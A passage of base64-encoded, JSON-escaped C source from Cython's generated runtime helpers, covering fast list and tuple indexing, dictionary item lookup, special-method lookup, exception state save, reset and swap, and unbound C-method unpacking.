iAod3JhcGFyb3VuZCAmIHVubGlrZWx5KGkgPCAwKSkge1xuICAgICAgICB3cmFwcGVkX2kgKz0gUHlMaXN0X0dFVF9TSVpFKG8pO1xuICAgIH1cbiAgICBpZiAoKCFib3VuZHNjaGVjaykgfHwgbGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KHdyYXBwZWRfaSwgUHlMaXN0X0dFVF9TSVpFKG8pKSkpIHtcbiAgICAgICAgUHlPYmplY3QgKnIgPSBQeUxpc3RfR0VUX0lURU0obywgd3JhcHBlZF9pKTtcbiAgICAgICAgUHlfSU5DUkVGKHIpO1xuICAgICAgICByZXR1cm4gcjtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpO1xuI2Vsc2VcbiAgICByZXR1cm4gUHlTZXF1ZW5jZV9HZXRJdGVtKG8sIGkpO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9UdXBsZV9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCB3cmFwYXJvdW5kLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgYm91bmRzY2hlY2spIHtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5X3NzaXplX3Qgd3JhcHBlZF9pID0gaTtcbiAgICBpZiAod3JhcGFyb3VuZCAmIHVubGlrZWx5KGkgPCAwKSkge1xuICAgICAgICB3cmFwcGVkX2kgKz0gUHlUdXBsZV9HRVRfU0laRShvKTtcbiAgICB9XG4gICAgaWYgKCghYm91bmRzY2hlY2spIHx8IGxpa2VseShfX1B5eF9pc192YWxpZF9pbmRleCh3cmFwcGVkX2ksIFB5VHVwbGVfR0VUX1NJWkUobykpKSkge1xuICAgICAgICBQeU9iamVjdCAqciA9IFB5VHVwbGVfR0VUX0lURU0obywgd3JhcHBlZF9pKTtcbiAgICAgICAgUHlfSU5DUkVGKHIpO1xuICAgICAgICByZXR1cm4gcjtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpO1xuI2Vsc2VcbiAgICByZXR1cm4gUHlTZXF1ZW5jZV9HZXRJdGVtKG8sIGkpO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksIGludCBpc19saXN0LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgd3JhcGFyb3VuZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ1lUSE9OX05DUF9VTlVTRUQgaW50IGJvdW5kc2NoZWNrKSB7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgaWYgKGlzX2xpc3QgfHwgUHlMaXN0X0NoZWNrRXhhY3QobykpIHtcbiAgICAgICAgUHlfc3NpemVfdCBuID0gKCghd3JhcGFyb3VuZCkgfCBsaWtlbHkoaSA+PSAwKSkgPyBpIDogaSArIFB5TGlzdF9HRVRfU0laRShvKTtcbiAgICAgICAgaWYgKCghYm91bmRzY2hlY2spIHx8IChsaWtlbHkoX19QeXhfaXNfdmFsaWRfaW5kZXgobiwgUHlMaXN0X0dFVF9TSVpFKG8pKSkpKSB7XG4gICAgICAgICAgICByZXR1cm4gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgbik7XG4gICAgICAgIH1cbiAgICB9XG4gICAgZWxzZSBpZiAoUHlUdXBsZV9DaGVja0V4YWN0KG8pKSB7XG4gICAgICAgIFB5X3NzaXplX3QgbiA9ICgoIXdyYXBhcm91bmQpIHwgbGlrZWx5KGkgPj0gMCkpID8gaSA6IGkgKyBQeVR1cGxlX0dFVF9TSVpFKG8pO1xuICAgICAgICBpZiAoKCFib3VuZHNjaGVjaykgfHwgbGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KG4sIFB5VHVwbGVfR0VUX1NJWkUobykpKSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnIgPSBQeVR1cGxlX0dFVF9JVEVNKG8sIG4pO1xuICAgICAgICAgICAgUHlfSU5DUkVGKHIpO1xuICAgICAgICAgICAgcmV0dXJuIHI7XG4gICAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgICBQeU1hcHBpbmdNZXRob2RzICptbSA9IFB5X1RZUEUobyktPnRwX2FzX21hcHBpbmc7XG4gICAgICAgIFB5U2VxdWVuY2VNZXRob2RzICpzbSA9IFB5X1RZUEUobyktPnRwX2FzX3NlcXVlbmNlO1xuICAgICAgICBpZiAobW0gJiYgbW0tPm1wX3N1YnNjcmlwdCkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnIsICprZXkgPSBQeUxvbmdfRnJvbVNzaXplX3QoaSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIWtleSkpIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgciA9IG1tLT5tcF9zdWJzY3JpcHQobywga2V5KTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihrZXkpO1xuICAgICAgICAgICAgcmV0dXJuIHI7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGxpa2VseShzbSAmJiBzbS0+c3FfaXRlbSkpIHtcbiAgICAgICAgICAgIGlmICh3cmFwYXJvdW5kICYmIHVubGlrZWx5KGkgPCAwKSAmJiBsaWtlbHkoc20tPnNxX2xlbmd0aCkpIHtcbiAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IGwgPSBzbS0+c3FfbGVuZ3RoKG8pO1xuICAgICAgICAgICAgICAgIGlmIChsaWtlbHkobCA+PSAwKSkge1xuICAgICAgICAgICAgICAgICAgICBpICs9IGw7XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX092ZXJmbG93RXJyb3IpKVxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcmV0dXJuIHNtLT5zcV9pdGVtKG8sIGkpO1xuICAgICAgICB9XG4gICAgfVxuI2Vsc2VcbiAgICBpZiAoaXNfbGlzdCB8fCAhUHlNYXBwaW5nX0NoZWNrKG8pKSB7XG4gICAgICAgIHJldHVybiBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSk7XG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpO1xufVxuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9HZXRJdGVtKFB5T2JqZWN0ICpkLCBQeU9iamVjdCoga2V5KSB7XG4gICAgUHlPYmplY3QgKnZhbHVlO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihkLCBrZXksICZ2YWx1ZSkgPT0gMCkpIHsgLy8gbm8gdmFsdWUsIG5vIGVycm9yXG4gICAgICAgIGlmICh1bmxpa2VseShQeVR1cGxlX0NoZWNrKGtleSkpKSB7XG4gICAgICAgICAgICBQeU9iamVjdCogYXJncyA9IFB5VHVwbGVfUGFjaygxLCBrZXkpO1xuICAgICAgICAgICAgaWYgKGxpa2VseShhcmdzKSkge1xuICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19LZXlFcnJvciwgYXJncyk7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGFyZ3MpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX0tleUVycm9yLCBrZXkpO1xuICAgICAgICB9XG4gICAgfVxuICAgIHJldHVybiB2YWx1ZTtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSwgaW50IHdpdGhfZXJyb3IpIHtcbiAgICBQeU9iamVjdCAqcmVzO1xuICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7XG4gICAgcmVzID0gX1B5VHlwZV9Mb29rdXAodHAsIGF0dHJfbmFtZSk7XG4gICAgaWYgKGxpa2VseShyZXMpKSB7XG4gICAgICAgIGRlc2NyZ2V0ZnVuYyBmID0gUHlfVFlQRShyZXMpLT50cF9kZXNjcl9nZXQ7XG4gICAgICAgIGlmICghZikge1xuICAgICAgICAgICAgUHlfSU5DUkVGKHJlcyk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXMgPSBmKHJlcywgb2JqLCAoUHlPYmplY3QgKil0cCk7XG4gICAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHdpdGhfZXJyb3IpIHtcbiAgICAgICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX0F0dHJpYnV0ZUVycm9yLCBhdHRyX25hbWUpO1xuICAgIH1cbiAgICByZXR1cm4gcmVzO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG5zdGF0aWMgX1B5RXJyX1N0YWNrSXRlbSAqXG5fX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSlcbntcbiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87XG4gICAgd2hpbGUgKChleGNfaW5mby0+ZXhjX3ZhbHVlID09IE5VTEwgfHwgZXhjX2luZm8tPmV4Y192YWx1ZSA9PSBQeV9Ob25lKSAmJlxuICAgICAgICAgICBleGNfaW5mby0+cHJldmlvdXNfaXRlbSAhPSBOVUxMKVxuICAgIHtcbiAgICAgICAgZXhjX2luZm8gPSBleGNfaW5mby0+cHJldmlvdXNfaXRlbTtcbiAgICB9XG4gICAgcmV0dXJuIGV4Y19pbmZvO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU2F2ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yikge1xuICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKHRzdGF0ZSk7XG4gICAgUHlPYmplY3QgKmV4Y192YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgaWYgKGV4Y192YWx1ZSA9PSBOVUxMIHx8IGV4Y192YWx1ZSA9PSBQeV9Ob25lKSB7XG4gICAgICAgICp2YWx1ZSA9IE5VTEw7XG4gICAgICAgICp0eXBlID0gTlVMTDtcbiAgICAgICAgKnRiID0gTlVMTDtcbiAgICB9IGVsc2Uge1xuICAgICAgICAqdmFsdWUgPSBleGNfdmFsdWU7XG4gICAgICAgIFB5X0lOQ1JFRigqdmFsdWUpO1xuICAgICAgICAqdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUoZXhjX3ZhbHVlKTtcbiAgICAgICAgUHlfSU5DUkVGKCp0eXBlKTtcbiAgICAgICAgKnRiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y192YWx1ZSk7XG4gICAgfVxuICAjZWxpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKHRzdGF0ZSk7XG4gICAgKnR5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7XG4gICAgKnZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICAqdGIgPSBleGNfaW5mby0+ZXhjX3RyYWNlYmFjaztcbiAgICBQeV9YSU5DUkVGKCp0eXBlKTtcbiAgICBQeV9YSU5DUkVGKCp2YWx1ZSk7XG4gICAgUHlfWElOQ1JFRigqdGIpO1xuICAjZWxzZVxuICAgICp0eXBlID0gdHN0YXRlLT5leGNfdHlwZTtcbiAgICAqdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTtcbiAgICAqdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgUHlfWElOQ1JFRigqdHlwZSk7XG4gICAgUHlfWElOQ1JFRigqdmFsdWUpO1xuICAgIFB5X1hJTkNSRUYoKnRiKTtcbiAgI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25SZXNldChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICp0eXBlLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICp0Yikge1xuICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgIFB5T2JqZWN0ICp0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSB2YWx1ZTtcbiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRih0eXBlKTtcbiAgICBQeV9YREVDUkVGKHRiKTtcbiAgI2Vsc2VcbiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7XG4gICAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87XG4gICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7XG4gICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSBleGNfaW5mby0+ZXhjX3RyYWNlYmFjaztcbiAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSB0eXBlO1xuICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSB2YWx1ZTtcbiAgICBleGNfaW5mby0+ZXhjX3RyYWNlYmFjayA9IHRiO1xuICAgICNlbHNlXG4gICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlO1xuICAgIHRtcF92YWx1ZSA9IHRzdGF0ZS0+ZXhjX3ZhbHVlO1xuICAgIHRtcF90YiA9IHRzdGF0ZS0+ZXhjX3RyYWNlYmFjaztcbiAgICB0c3RhdGUtPmV4Y190eXBlID0gdHlwZTtcbiAgICB0c3RhdGUtPmV4Y192YWx1ZSA9IHZhbHVlO1xuICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9IHRiO1xuICAgICNlbmRpZlxuICAgIFB5X1hERUNSRUYodG1wX3R5cGUpO1xuICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKHRtcF90Yik7XG4gICNlbmRpZlxufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU3dhcChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yikge1xuICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjtcbiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSAqdmFsdWU7XG4gICAgaWYgKHRtcF92YWx1ZSA9PSBOVUxMIHx8IHRtcF92YWx1ZSA9PSBQeV9Ob25lKSB7XG4gICAgICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTtcbiAgICAgICAgdG1wX3ZhbHVlID0gTlVMTDtcbiAgICAgICAgdG1wX3R5cGUgPSBOVUxMO1xuICAgICAgICB0bXBfdGIgPSBOVUxMO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHRtcF90eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRSh0bXBfdmFsdWUpO1xuICAgICAgICBQeV9JTkNSRUYodG1wX3R5cGUpO1xuICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgIHRtcF90YiA9ICgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgdG1wX3ZhbHVlKS0+dHJhY2ViYWNrO1xuICAgICAgICBQeV9YSU5DUkVGKHRtcF90Yik7XG4gICAgICAgICNlbHNlXG4gICAgICAgIHRtcF90YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayh0bXBfdmFsdWUpO1xuICAgICAgICAjZW5kaWZcbiAgICB9XG4gICNlbGlmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87XG4gICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7XG4gICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSBleGNfaW5mby0+ZXhjX3RyYWNlYmFjaztcbiAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSAqdHlwZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gKnZhbHVlO1xuICAgIGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrID0gKnRiO1xuICAjZWxzZVxuICAgIHRtcF90eXBlID0gdHN0YXRlLT5leGNfdHlwZTtcbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5leGNfdHlwZSA9ICp0eXBlO1xuICAgIHRzdGF0ZS0+ZXhjX3ZhbHVlID0gKnZhbHVlO1xuICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9ICp0YjtcbiAgI2VuZGlmXG4gICAgKnR5cGUgPSB0bXBfdHlwZTtcbiAgICAqdmFsdWUgPSB0bXBfdmFsdWU7XG4gICAgKnRiID0gdG1wX3RiO1xufVxuI2Vsc2VcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXhjZXB0aW9uU3dhcChQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHtcbiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7XG4gICAgUHlFcnJfR2V0RXhjSW5mbygmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpO1xuICAgIFB5RXJyX1NldEV4Y0luZm8oKnR5cGUsICp2YWx1ZSwgKnRiKTtcbiAgICAqdHlwZSA9IHRtcF90eXBlO1xuICAgICp2YWx1ZSA9IHRtcF92YWx1ZTtcbiAgICAqdGIgPSB0bXBfdGI7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoXG4gICAgY29uc3QgY2hhciogZnVuY19uYW1lLFxuICAgIFB5T2JqZWN0KiBrd19uYW1lKVxue1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICIlcygpIGdvdCBtdWx0aXBsZSB2YWx1ZXMgZm9yIGtleXdvcmQgYXJndW1lbnQgXCclVVwnIiwgZnVuY19uYW1lLCBrd19uYW1lKTtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMFxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TZWxmbGVzc0NhbGwoUHlPYmplY3QgKm1ldGhvZCwgUHlPYmplY3QgKmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIFB5T2JqZWN0ICpzZWxmbGVzc19hcmdzID0gUHlUdXBsZV9HZXRTbGljZShhcmdzLCAxLCBQeVR1cGxlX1NpemUoYXJncykpO1xuICAgIGlmICh1bmxpa2VseSghc2VsZmxlc3NfYXJncykpIHJldHVybiBOVUxMO1xuICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGwobWV0aG9kLCBzZWxmbGVzc19hcmdzLCBrd2FyZ3MpO1xuICAgIFB5X0RFQ1JFRihzZWxmbGVzc19hcmdzKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMFxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TZWxmbGVzc0NhbGwoUHlPYmplY3QgKm1ldGhvZCwgUHlPYmplY3QgKiphcmdzLCBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3duYW1lcykge1xuICAgICAgICByZXR1cm4gX1B5T2JqZWN0X1ZlY3RvcmNhbGxcbiAgICAgICAgICAgIChtZXRob2QsIGFyZ3MgPyBhcmdzKzEgOiBOVUxMLCBuYXJncyA/IG5hcmdzLTEgOiAwLCBrd25hbWVzKTtcbn1cbiNlbHNlXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKSB7XG4gICAgcmV0dXJuXG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG4gICAgX1B5T2JqZWN0X1ZlY3RvcmNhbGxcbiNlbHNlXG4gICAgUHlPYmplY3RfVmVjdG9yY2FsbFxuI2VuZGlmXG4gICAgICAgIChtZXRob2QsIGFyZ3MgPyBhcmdzKzEgOiBOVUxMLCBuYXJncyA/IChzaXplX3QpIG5hcmdzLTEgOiAwLCBrd25hbWVzKTtcbn1cbiNlbmRpZlxuc3RhdGljIFB5TWV0aG9kRGVmIF9fUHl4X1VuYm91bmRDTWV0aG9kX0RlZiA9IHtcbiAgICAgIkN5dGhvblVuYm91bmRDTWV0aG9kIixcbiAgICAgX19QWVhfUkVJTlRFUlBSRVRfRlVOQ0lPTihQeUNGdW5jdGlvbiwgX19QeXhfU2VsZmxlc3NDYWxsKSxcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEMwMDAwXG4gICAgIE1FVEhfVkFSQVJHUyB8IE1FVEhfS0VZV09SRFMsXG4jZWxzZVxuICAgICBNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUyxcbiNlbmRpZlxuICAgICBOVUxMXG59O1xuc3RhdGljIGludCBfX1B5eF9UcnlVbnBhY2tVbmJvdW5kQ01ldGhvZChfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIHRhcmdldCkge1xuICAgIFB5T2JqZWN0ICptZXRob2QsICpyZXN1bHQ9TlVMTDtcbiAgICBtZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKHRhcmdldC0+dHlwZSwgKnRhcmdldC0+bWV0aG9kX25hbWUpO1xuICAgIGlmICh1bmxpa2VseSghbWV0aG9kKSlcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIHJlc3VsdCA9IG1ldGhvZDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICBpZiAobGlrZWx5KF9fUHl4X1R5cGVDaGVjayhtZXRob2QsICZQeU1ldGhvZERlc2NyX1R5cGUpKSlcbiAgICB7XG4gICAgICAgIFB5TWV0aG9kRGVzY3JPYmplY3QgKmRlc2NyID0gKFB5TWV0aG9kRGVzY3JPYmplY3QqKSBtZXRob2Q7XG4gICAgICAgIHRhcmdldC0+ZnVuYyA9IGRlc2NyLT5kX21ldGhvZC0+bWxfbWV0aDtcbiAgICAgICAgdGFyZ2V0LT5mbGFnID0gZGVzY3ItPmRfbWV0aG9kLT5tbF9mbGFncyAmIH4oTUVUSF9DTEFTUyB8IE1FVEhfU1RBVElDIHwgTUVUSF9DT0VYSVNUIHwgTUVUSF9TVEFDS0xFU1MpO1xuICAgIH0gZWxzZVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4jZWxzZVxuICAgIGlmIChQeUNGdW5jdGlvbl9DaGVjayhtZXRob2QpKVxuI2VuZGlmXG4gICAge1xuICAgICAgICBQeU9iamVjdCAqc2VsZjtcbiAgICAgICAgaW50IHNlbGZfZm91bmQ7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICAgICAgc2VsZiA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcobWV0aG9kLCAiX19zZWxmX18iKTtcbiAgICAgICAgaWYgKCFzZWxmKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICB9XG4jZWxzZVxuICAgICAgICBzZWxmID0gUHlDRnVuY3Rpb25fR0VUX1NFTEYobWV0aG9kKTtcbiNlbmRpZlxuICAgICAgICBzZWxmX2ZvdW5kID0gKHNlbGYgJiYgc2VsZiAhPSBQeV9Ob25lKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgICAgICBQeV9YREVDUkVGKHNlbGYpO1xuI2VuZGlmXG4gICAgICAgIGlmIChzZWxmX2ZvdW5kKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqdW5ib3VuZF9tZXRob2QgPSBQeUNGdW5jdGlvbl9OZXcoJl9fUHl4X1VuYm91bmRDTWV0aG9kX0RlZiwgbWV0aG9kKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdW5ib3VuZF9tZXRob2QpKSByZXR1cm4gLTE7XG4gICAgICAgICAgICBQeV9ERUNSRUYobWV0aG9kKTtcbiAgICAgICAgICAgIHJlc3VsdCA9IHVuYm91bmRfbWV0aG9kO1xuICAgICAgICB9XG4gICAgfVxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIGlmICh1bmxpa2VseSh0YXJnZXQtPm1ldGhvZCkpIHtcbiAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7XG4gICAgfSBlbHNlXG4j